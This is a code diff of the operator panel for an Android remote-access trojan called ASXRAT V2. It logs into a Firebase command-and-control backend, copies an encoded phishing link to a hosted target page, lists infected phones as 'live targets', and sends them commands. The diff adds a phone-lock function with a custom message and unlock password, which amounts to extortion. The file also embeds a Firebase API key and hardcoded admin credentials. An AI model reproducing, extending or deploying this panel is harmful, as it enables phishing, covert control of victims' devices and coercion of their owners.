@@ -8,21 +8,18 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root { --red: #ff0000; --bg: #000000; --card: #0d0d0d; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; overflow-x: hidden; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
         
-        /* LOGIN AREA */
-        #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px solid var(--red); }
-        .login-card { background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid var(--red); width: 85%; max-width: 380px; text-align: center; box-shadow: 0 0 25px var(--red); }
-        
-        .profile-img { width: 110px; height: 110px; border-radius: 50%; border: 3px solid var(--red); margin-bottom: 15px; object-fit: cover; box-shadow: 0 0 15px var(--red); }
-        .welcome-text { font-size: 11px; color: #eee; margin-bottom: 20px; line-height: 1.6; letter-spacing: 1px; }
+        #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .banner-img { width: 100%; max-width: 450px; height: auto; min-height: 150px; object-fit: cover; border: 2px solid var(--red); border-bottom: none; border-radius: 15px 15px 0 0; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); display: block; }
+        .login-card { background: var(--card); padding: 25px; border-radius: 0 0 15px 15px; border: 2px solid var(--red); width: 85%; max-width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(255, 0, 0, 0.3); margin-top: -2px; }
         
         input, select { width: 90%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; }
-        .btn-main { background: var(--red); color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: 0.3s; }
-        .btn-main:active { transform: scale(0.95); opacity: 0.8; }
+        .btn-main { background: var(--red); color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
         
-        #dash { display: none; padding: 15px; max-width: 500px; margin: auto; }
-        .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        #dash { display: none; padding: 15px; max-width: 550px; margin: auto; }
+        .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); }
+        .control-group { background: #000; padding: 10px; border-radius: 8px; border: 1px solid #222; margin-top: 10px; }
         .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
         .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 12px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
@@ -30,14 +27,13 @@
 <body>
 
     <div id="auth">
+        <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img" onerror="this.src='https://via.placeholder.com/450x150/000/f00?text=ASXRAT+V2'">
         <div class="login-card">
-            <img src="https://drive.google.com/file/d/1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7/view?usp=drivesdk" class="profile-img" onerror="this.src='https://ui-avatars.com/api/?name=ASXRAT&background=ff0000&color=fff'">
-            <div class="welcome-text">
+            <div style="font-size:11px; color:#eee; margin-bottom:20px;">
                 HELO BRO SELAMAT DATANG DI APK ASXRAT SEMOGA BETAH<br><br>
-                <span style="color:var(--red); font-weight: bold;">POWERED BY : ELVOXI</span><br>
+                <span style="color:var(--red); font-weight:bold;">POWERED BY : ELVOXI</span><br>
                 CONTACT TELEGRAM : @Elvoxi_Reals01😘
             </div>
-            
             <input type="text" id="email-input" placeholder="EMAIL ADDRESS...">
             <input type="password" id="key-input" placeholder="SECRET KEY...">
             <button onclick="login()" class="btn-main">ACCESS PANEL</button>
@@ -45,29 +41,22 @@
     </div>
 
     <div id="dash">
-        <div style="padding: 15px; border: 1px solid var(--red); border-radius: 10px; margin-bottom: 20px; background: #050505; text-align: center;">
-            <b id="user-display" style="color:var(--red); font-size: 18px;">...</b> <br>
-            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000; margin-top: 15px;">📋 COPY MY LINK PHISING</button>
-            
+        <div style="padding:15px; border:1px solid var(--red); border-radius:10px; background:#050505; text-align:center; margin-bottom:20px;">
+            <b id="user-display" style="color:var(--red); font-size:18px;">...</b><br>
+            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000;">📋 COPY MY LINK PHISING</button>
             <div id="creation-tools" style="display:none; margin-top:20px; border-top:1px dashed #444; padding-top:15px;">
-                <b style="color:var(--red)">CREATE SUB-ACCOUNT</b>
                 <input type="text" id="new-email" placeholder="NEW EMAIL...">
                 <input type="text" id="new-key" placeholder="NEW KEY...">
-                <select id="role-select">
-                    <option value="USER">ROLE: USER</option>
-                    <option value="OWNER" id="opt-owner">ROLE: OWNER</option>
-                </select>
                 <button onclick="generateUser()" class="btn-main">ACTIVATE ACCOUNT</button>
             </div>
         </div>
 
-        <h4 style="color:var(--red); text-align: center; letter-spacing: 3px;">📡 MY LIVE TARGETS</h4>
+        <h4 style="color:var(--red); text-align:center; letter-spacing:3px;">📡 LIVE TARGETS</h4>
         <div id="list"></div>
     </div>
 
 <script>
     const linkPhising = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
-
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
       authDomain: "rat-html.firebaseapp.com",
@@ -85,9 +74,8 @@
     function login() {
         const mail = document.getElementById('email-input').value;
         const key = document.getElementById('key-input').value;
-        
         if(mail === "elvoxi@gmail.com" && key === "elvoxi122") {
-            currentKey = "elvoxi122"; 
+            currentKey = "elvoxi122";
             document.getElementById('creation-tools').style.display = 'block';
             start();
         } else {
@@ -95,10 +83,6 @@
                 const data = s.val();
                 if(s.exists() && data.email === mail) {
                     currentKey = key;
-                    if(data.role === "OWNER") {
-                        document.getElementById('creation-tools').style.display = 'block';
-                        document.getElementById('opt-owner').remove();
-                    }
                     start();
                 } else alert("DATA SALAH!");
             });
@@ -118,13 +102,20 @@
                 if(d.belongsTo === currentKey) {
                     list.innerHTML += `
                         <div class="target-card">
-                            <b style="color:var(--red)">📱 ${d.model}</b> <br>
-                            <input type="text" id="tts-${child.key}" placeholder="Ketik pesan suara..." style="width:100%; margin-top:10px;">
+                            <b style="color:var(--red)">📱 ${d.model}</b>
+                            <div class="control-group">
+                                <input type="text" id="lock-msg-${child.key}" placeholder="Pesan Lock (Patah-Patah)..." style="font-size:10px;">
+                                <input type="text" id="lock-pw-${child.key}" placeholder="Set Password Unlock..." style="font-size:10px;">
+                                <div class="btn-grid">
+                                    <button class="btn-rat" onclick="sendLock('${child.key}')" style="color:red">🔒 LOCK HP</button>
+                                    <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')" style="color:green">🔓 UNLOCK</button>
+                                </div>
+                            </div>
+                            <input type="text" id="tts-${child.key}" placeholder="Teks suara..." style="width:100%; margin-top:10px;">
                             <div class="btn-grid">
                                 <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SPEAK</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 VIBRATE</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER</button>
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'lock_screen')">🔒 LOCK</button>
                             </div>
                         </div>`;
                 }
@@ -133,6 +124,13 @@
     }
 
     function cmd(id, act) { db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); }
+    
+    function sendLock(id) {
+        const msg = document.getElementById('lock-msg-' + id).value || "HP DISITA ASXRAT V2!";
+        const pw = document.getElementById('lock-pw-' + id).value || "123";
+        db.ref(`mario/commands/${id}`).set({ action: 'lock_screen', text: msg, pass: pw, time: Date.now() });
+    }
+
     function sendTTS(id) {
         const txt = document.getElementById('tts-' + id).value;
         if(!txt) return;
@@ -142,8 +140,7 @@
     function generateUser() {
         const mail = document.getElementById('new-email').value;
         const key = document.getElementById('new-key').value;
-        const role = document.getElementById('role-select').value;
-        db.ref('asxrat/accounts/' + key).set({ email: mail, role: role });
+        db.ref('asxrat/accounts/' + key).set({ email: mail, role: "USER" });
         alert("ACCOUNT SUCCESS!");
     }
 
@@ -151,7 +148,7 @@
         const encoded = btoa(currentKey);
         const full = linkPhising + "?id=" + encoded;
         navigator.clipboard.writeText(full);
-        alert("LINK PHISING DISALIN!\nKey anda terenkripsi.");
+        alert("LINK PHISING DISALIN!");
     }
 </script>
 </body>
